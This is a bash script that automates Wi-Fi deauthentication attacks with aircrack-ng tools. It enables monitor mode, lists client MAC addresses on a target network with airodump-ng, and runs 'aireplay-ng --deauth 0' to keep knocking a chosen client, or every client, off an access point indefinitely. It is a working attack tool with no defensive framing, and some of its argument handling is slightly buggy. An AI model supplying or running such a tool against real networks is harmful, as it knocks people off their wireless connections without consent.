#!/bin/env bash


packgeNeeded=("aircrack-ng" "iw" "wireless-tools" "network-manager" )

# echo help if no arguments were given 
if [ $# -eq 0 ]
then
    echo -e "-e for wifi essid\n-b for wifi bssid\n-h for help\n-l list wifi"
fi

# Get arguments 
# reset True > disable monitor mode befor exit
# r and l without : coz thir is no input 
while getopts "b:e:harl:c:" option ; 
do
    case $option in
        e) # set wiff essid
            wifiEssid=$OPTARG;;
        b)
            wifiBssid=$OPTARG;;
        r)
            reset=True;;
        h)
            echo -e "-e for wifi essid\n-b for wifi bssid\n-r disable monitor mode\n-l list wifi\n-c target mac address"
            ;;
        l)
            nmcli device wifi list ifname $OPTARG || echo -e "\n-l interface name " ; iw dev| grep "Interface"
            exit
            ;;
        c)
            targetMac=$OPTARG
            ;;
        a)
            Kickall=True
            ;;
        \?) # unexpected arguments 
            echo -e "\nunexpected argument run -h for help "
            exit;;
    esac 
done

# ================================= Functions ================================= #

# check for used packages
# dpkg -s $1 &> /dev/null [ $? -eq 0 ]  0 > installed , 1 > not installed

function installAllPackages(){
    read -p "Do you want to install missing Packages [y]: " answer
    if [[ $answer =~ [yY] ]];then sudo apt-get install -y ${packgeNeeded[@]}  ;else echo You must install all packges && exit ;fi
    
}


# start monitor mode 
function startMonitorMode {
    # get the current interface name
    interface=$(iw dev | grep Interface |cut -d " " -f2)
    
    # Check if monitor mode is on 
    interfaceMode=$(iwconfig $interface |grep -o Monitor)
    # if $interfaceMode is not empty > return interface name else start monitor mode
    if [ ! -z $interfaceMode ]
    then
        echo "$interface"
    else
        sudo airmon-ng start $interface > /dev/null 2>&1
        interface=$(iw dev | grep Interface |cut -d " " -f2)
        echo "$interface"
        
    fi

}


# stop monitor mode 
function stopMonitorMode() {
    interface=$(iw dev | grep Interface |cut -d " " -f2)
    sudo airmon-ng stop $interface > /dev/null 2>&1
    echo seting MonitorMode off
    # Check if monitor mode is off
    interfaceMode=$(iwconfig $interface |grep -o Monitor)
    # if monitor mode still enabled 
    # Try another way to stop it 
    if [ ! -z $interfaceMode ]
    then
        sudo ifconfig $interface down 
        sudo iwconfig $interface mode Managed
        sudo ifconfig $interface up
    else
        echo "Monitor mode is off"
    fi
    
}

function resetMode(){
    if [ $reset ]
    then
        stopMonitorMode 
    fi

}

# Get mac list 
function GetMacList() {
    # start monitor mode and return the name of the interface
    #interfacee=$(startMonitorMode)
    echo $interface is on Monitor Mode
    sudo airodump-ng $1 -i $interface --output-format csv -w temp
    # grep the devices mac
    cat temp-01.csv | cut -d , -f 1 
    sudo rm -f temp*
    resetMode
}


# Kick user by mac address
function kickUser(){
    if [ $Kickall ]
    then
        sudo aireplay-ng --deauth 0 -a $1 $2
    else
        sudo aireplay-ng --deauth 0 -a $1 -c $2 $3
    fi
    resetMode
}



# ================================= Functions ================================= #

# Check for all needed packges first  - if one is missing > install all
dpkg -s ${packgeNeeded[@]} > /dev/null 2>&1 || installAllPackages 


interface=$(startMonitorMode)

# if the bessid is given 
if [ ! -z $wifiBssid ] && [ -z $targetMac ] && [ -z Kickall ]
then
    # Start GetMacList function with essid option
    GetMacList "-d $wifiBssid"
    echo "use -b essid -c TargeMac option to kick user"
    exit
elif [ ! -z $wifiEssid ]
then
    # Start GetMacList function with essid option
    GetMacList "--essid $wifiEssid"
    echo "use -b essid -c TargeMac option to kick user"
    exit
elif [ ! -z $wifiBssid ] && [ ! -z $targetMac ]
then
    kickUser $wifiBssid $targetMac $interface
    exit
elif [ ! -z $wifiBssid ] && [ ! -z $Kickall ] 
then
    kickUser $wifiBssid $interface $Kickall
    exit
else
    echo "You Must Give Essid or bssid "
fi

